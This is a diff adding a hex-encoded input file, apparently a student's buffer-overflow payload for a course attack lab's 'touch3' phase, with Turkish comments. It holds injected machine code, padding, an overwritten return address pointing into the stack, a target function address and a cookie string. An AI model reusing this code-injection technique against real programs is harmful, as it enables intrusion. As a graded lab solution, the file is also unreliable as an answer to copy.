@@ -1,0 +1,22 @@
+48 c7 c7 00 fa 61 55        /* phase2.s -> phase2.dump -> oradaki kod */
+48 c7 c6 09 fa 61 55
+c3
+00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+a8 f9 61 55 00 00 00 00     /* adr of rsp */
+13 1d 40 00 00 00 00 00	    /* touch 3 */
+34 34 34 61 30 37 66 63 00  /* cookie'deki her karakter 2byte'lık ascii kodu olacak buraya */
+1c 14 00 00                 /* tersten simetriğiyle çarparak hesapladığını koy */
+b8 14 00 00
+2c 0b 00 00
+30 12 00 00
+30 12 00 00
+2c 0b 00 00
+b8 14 00 00
+1c 14 00 00
